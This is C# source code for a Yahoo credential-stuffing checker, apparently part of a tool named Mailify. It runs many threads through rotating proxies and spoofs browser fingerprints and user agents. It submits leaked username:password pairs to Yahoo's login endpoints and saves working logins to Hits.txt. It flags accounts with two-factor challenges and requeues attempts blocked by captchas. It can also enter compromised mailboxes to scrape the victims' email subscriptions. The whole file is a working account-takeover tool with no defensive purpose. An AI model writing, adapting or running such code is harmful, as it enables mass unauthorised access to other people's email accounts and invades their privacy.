using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Yahoo_2
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
			proxyTimeout = _proxyTimeout;
			proxyType = _proxyType;

			new Thread(() => Variables.Mail_Mode_Title()).Start();

			ThreadPool.SetMinThreads(maxThreads, maxThreads);
			Thread[] threads1 = new Thread[maxThreads];
			for (int i = 0; i < maxThreads; i++)
			{
				threads1[i] = new Thread(() =>
				{
					while (!Variables.combos.IsEmpty)
					{
						Variables.combos.TryDequeue(out string data);
						Worker(data);
					}
				});
				threads1[i].Start();
			}
			for (int i = 0; i < maxThreads; i++) threads1[i].Join();
			Thread.Sleep(-1);

		}
		static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
				var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var request = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    request.Proxy.ConnectTimeout = proxyTimeout;
                    request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

					request.AddHeader("Accept", "*/*");
					request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
					request.AddHeader("Pragma", "no-cache");
					string input = request.Get("https://login.yahoo.com/").ToString();
					string text = Functions.LR(input, "name=\"crumb\" value=\"", "\"").FirstOrDefault();
					string text2 = Functions.LR(input, "name=\"acrumb\" value=\"", "\"").FirstOrDefault();
					string text3 = Functions.LR(input, "name=\"sessionIndex\" value=\"", "\"").FirstOrDefault();
					request.AddHeader("Host", "login.yahoo.com");
					request.AddHeader("Connection", "keep-alive");
					request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36");
					request.AddHeader("X-Requested-With", "XMLHttpRequest");
					request.AddHeader("Origin", "https://login.yahoo.com");
					request.AddHeader("Sec-Fetch-Site", "same-origin");
					request.AddHeader("Sec-Fetch-Mode", "cors");
					request.AddHeader("Sec-Fetch-Dest", "empty");
					request.AddHeader("Referer", "https://login.yahoo.com/");
					request.AddHeader("Accept-Encoding", "gzip, deflate, br");
					request.AddHeader("Accept-Language", "en-US,en;q=0.9");
					string text4 = request.Post("https://login.yahoo.com/", "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Africa%2FCairo%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.~ANGLE%20(NVIDIA%20GeForce%20GT%20710%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221280%22%2C%22h%22%3A%221024%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22984%22%2C%22h%22%3A%221280%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1611840196072%2C%22render%22%3A1611840197054%7D%7D&crumb=" + text + "&acrumb=" + text2 + "&sessionIndex=" + text3 + "&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Afalse%7D%7D&username=" + credentials[0] + "&passwd=&signin=Next&persistent=y", "application/x-www-form-urlencoded").ToString();
					if (text4.Contains("location\":\"/account/challenge/password"))
					{
						string str = Functions.LR(text4, "\"location\":\"", "\"}").FirstOrDefault();
						request.AllowAutoRedirect = false;
						request.AddHeader("Host", "login.yahoo.com");
						request.AddHeader("Connection", "keep-alive");
						request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36");
						request.AddHeader("X-Requested-With", "XMLHttpRequest");
						request.AddHeader("Origin", "https://login.yahoo.com");
						request.AddHeader("Sec-Fetch-Site", "same-origin");
						request.AddHeader("Sec-Fetch-Mode", "cors");
						request.AddHeader("Sec-Fetch-Dest", "empty");
						request.AddHeader("Referer", "https://login.yahoo.com/");
						request.AddHeader("Accept-Encoding", "gzip, deflate, br");
						request.AddHeader("Accept-Language", "en-US,en;q=0.9");
						string text5 = request.Post("https://login.yahoo.com" + str, "browser-fp-data=%7B%22language%22%3A%22en%22%2C%22colorDepth%22%3A32%2C%22deviceMemory%22%3A%22unknown%22%2C%22pixelRatio%22%3A2%2C%22hardwareConcurrency%22%3A%22unknown%22%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22iPhone%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Apple+Inc.%7EApple+GPU%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A1%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A5%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A13%2C%22hash%22%3A%22ef5cebb772562bd1af018f7f69d53c9e%22%7D%2C%22audio%22%3A%2235.10892717540264%22%2C%22resolution%22%3A%7B%22w%22%3A%22414%22%2C%22h%22%3A%22896%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22896%22%2C%22h%22%3A%22414%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1604943657070%2C%22render%22%3A1604943657274%7D%7D&crumb=" + text + "&acrumb=" + text2 + "&sessionIndex=" + text3 + "&displayName=" + credentials[0] + "&passwordContext=normal&password=" + credentials[1] + "&verifyPassword=Next", "application/x-www-form-urlencoded").ToString();
						if (text5.Contains("https://guce.yahoo.com/consent") || text5.Contains("https://login.yahoo.com/account/comm-channel") || text5.Contains("https://login.yahoo.com/account/fb-messenger"))
						{
							if (Convert.ToBoolean(Config.Capture_Subscriptions) == true)
							{
								request.ClearAllHeaders();
								request.AllowAutoRedirect = false;
								request.AddHeader("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/18C66 Safari/604.1");
								request.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
								request.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
								request.AddHeader("accept-encoding", "br, gzip, deflate");
								request.AddHeader("dnt", "1");
								request.AddHeader("upgrade-insecure-requests", "1");
								string pre = request.Get("https://mail.yahoo.com/m/?.src=ym&reason=mobile").ToString();

								var MBOXID = Functions.LR(pre, "\"selectedMailbox\":{\"id\":\"", "\"").FirstOrDefault();
								var WSSID = Functions.LR(pre, "\"mailWssid\":\"", "\"").FirstOrDefault();
								var APPID = Functions.LR(pre, "\"appId\":\"", "\"").FirstOrDefault();
								var YMREQID = Guid.NewGuid().ToString();
								var EMAIL = WebUtility.UrlEncode(credentials[0]);

								request.ClearAllHeaders();
								request.AllowAutoRedirect = false;
								request.AddHeader("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/18C66 Safari/604.1");
								request.AddHeader("accept", "application/json");
								request.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
								request.AddHeader("accept-encoding", "gzip, deflate, br");
								request.AddHeader("referer", "https://mail.yahoo.com/");
								request.AddHeader("origin", "https://mail.yahoo.com");
								request.AddHeader("dnt", "1");
								string capture_subs = request.Get($"https://data.mail.yahoo.com/f/subscription/email/brand?acctid=1&mboxid={MBOXID}&wssid={WSSID}&appid={APPID}&ymreqid={YMREQID}&email={EMAIL}&sort=score.desc").ToString();

								var subcount = Functions.JSON(capture_subs, "count").FirstOrDefault();
								var subs = string.Join(Environment.NewLine, Functions.LR(capture_subs, "\"name\":\"", "\",\"score\":", true));


								Variables.Valid++;
								Variables.Checked++;
								Variables.cps++;
								lock (Variables.WriteLock)
								{
									Variables.remove(combo);
									if (Config.kekr_UI == "LOG")
									{
										Console.WriteLine($"[+] {combo}", Color.Green);
									}
									File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
									File.AppendAllText(Variables.subcaps + $"[Sub Captured].txt", "------------------------------------------" + Environment.NewLine + combo + Environment.NewLine + "====================SUBS==================" + Environment.NewLine + subs + Environment.NewLine + Environment.NewLine);
								}
							}
							else
							{
								Variables.Valid++;
								Variables.Checked++;
								Variables.cps++;
								lock (Variables.WriteLock)
								{
									Variables.remove(combo);
									if (Config.kekr_UI == "LOG")
									{
										Console.WriteLine($"[+] {combo}", Color.Green);
									}
									File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
								}
							}
						}
						else if (text5.Contains("/account/challenge/password"))
						{
							Variables.Invalid++;
							Variables.Checked++;
							Variables.cps++;
							lock (Variables.WriteLock)
                            {
								Variables.remove(combo);
							}
						}
						else if (text5.Contains("/account/challenge/challenge-selector?"))
						{
							Variables.Custom++;
							Variables.Checked++;
							Variables.cps++;
							lock (Variables.WriteLock)
							{
								Variables.remove(combo);
								File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
							}
						}
						else
						{
							Variables.combos.Enqueue(combo);
							Variables.proxyIndex++;
							Variables.Errors++;
						}
					}
					else if (text4.Contains("error\":\"messages.INVALID_USERNAME") || text4.Contains("error\":\"messages.ERROR_NOTFOUND") || text4.Contains("messages.INVALID_IDENTIFIER") || text4.Contains("Sorry, we don't recognize this account"))
					{
						Variables.Invalid++;
						Variables.Checked++;
						Variables.cps++;
						lock (Variables.WriteLock)
                        {
							Variables.remove(combo);
						}
					}
					else if (text4.Contains("/account/challenge/push") || text4.Contains("/account/challenge/yak-code"))
					{
						Variables.Custom++;
						Variables.Checked++;
						Variables.cps++;
						lock (Variables.WriteLock)
						{
							Variables.remove(combo);
							File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
						}
					}
					else if (text4.Contains("location\":\"/account/challenge/recaptcha") || text4.Contains("location\":\"/account/challenge/arkose"))
					{
						Variables.combos.Enqueue(combo);
						Variables.proxyIndex++;
						Variables.Errors++;
					}
					else
                    {
						Variables.combos.Enqueue(combo);
						Variables.proxyIndex++;
						Variables.Errors++;
					}

                }
            }
            catch
            {
				Variables.combos.Enqueue(combo);
				Variables.proxyIndex++;
				Variables.Errors++;
			}
        }
    }
}